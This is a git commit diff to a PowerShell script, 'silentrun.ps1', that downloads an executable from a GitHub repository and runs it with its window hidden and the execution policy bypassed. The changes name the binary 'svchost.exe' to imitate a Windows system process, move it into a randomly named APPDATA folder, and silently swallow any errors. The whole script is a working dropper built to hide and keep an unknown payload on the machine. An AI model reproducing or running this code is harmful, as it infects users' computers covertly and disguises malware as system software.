12baf7f6d9697bb90afdb44da2b287234b58f1bf
Unhiin <133892941+hypnotixx0@users.noreply.github.com>
2026-05-10 20:51:50 -0700

    Update silentrun.ps1

--- silentrun.ps1
+++ silentrun.ps1
@@ -2,12 +2,15 @@
 # Usage: powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File script.ps1
 
 $exeUrl = "https://github.com/hypnotixx0/xenolord/raw/refs/heads/main/svchost.exe"
-$exePath = "$env:TEMP\updater.exe"
+$exePath = "$env:TEMP\svchost.exe"
+$randomFolder = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
+$finalPath = "$env:APPDATA\$randomFolder"
 
 try {
     Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
-    Start-Process -FilePath $exePath -ArgumentList "/silent" -WindowStyle Hidden -Wait
-    Remove-Item $exePath -Force
+    Start-Process -FilePath $exePath -WindowStyle Hidden -Wait
+    New-Item -ItemType Directory -Path $finalPath -Force | Out-Null
+    Move-Item -Path $exePath -Destination "$finalPath\svchost.exe" -Force
 } catch {
     # Silently fail
 }
